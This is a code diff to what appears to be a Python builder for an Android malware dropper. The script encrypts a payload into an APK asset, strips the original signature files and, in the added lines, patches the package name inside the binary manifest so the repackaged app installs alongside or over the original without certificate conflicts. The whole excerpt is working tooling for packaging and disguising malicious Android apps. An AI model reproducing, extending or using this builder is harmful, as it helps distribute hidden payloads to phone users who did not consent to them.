@@ -259,6 +259,23 @@ def encrypt_payload(data: bytes) -> bytes:
     cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
     return iv + cipher.encrypt(pad(data, AES.block_size))
 
+OLD_PKG = "com.gdww.ihwc.hpfv"
+NEW_PKG = "com.gdww.ihwc.hpfx"   # same length; avoids original-cert conflict on reinstall
+
+def _patch_pkg(data: bytes) -> bytes:
+    """Replace OLD_PKG with NEW_PKG in binary AXML (UTF-16LE strings)."""
+    old = OLD_PKG.encode('utf-16-le')
+    new = NEW_PKG.encode('utf-16-le')
+    result = bytearray(data)
+    pos = 0
+    while True:
+        idx = result.find(old, pos)
+        if idx == -1:
+            break
+        result[idx:idx + len(old)] = new
+        pos = idx + len(new)
+    return bytes(result)
+
 def rebuild_dropper(payload_bytes: bytes) -> bytes:
     encrypted = encrypt_payload(payload_bytes)
     buf = io.BytesIO()
@@ -267,10 +284,12 @@ def rebuild_dropper(payload_bytes: bytes) -> bytes:
         for item in zin.infolist():
             if item.filename.startswith("META-INF/"):
                 continue
+            data = zin.read(item)          # ZipInfo direct read — safe for mangled filenames
             if item.filename == ASSET_NAME:
-                zout.writestr(item, encrypted)
-            else:
-                zout.writestr(item, zin.read(item.filename))
+                data = encrypted
+            elif item.filename == "AndroidManifest.xml":
+                data = _patch_pkg(data)
+            zout.writestr(item, data)
     return buf.getvalue()
 
 # ─── Keyboards ────────────────────────────────────────────────────────────────
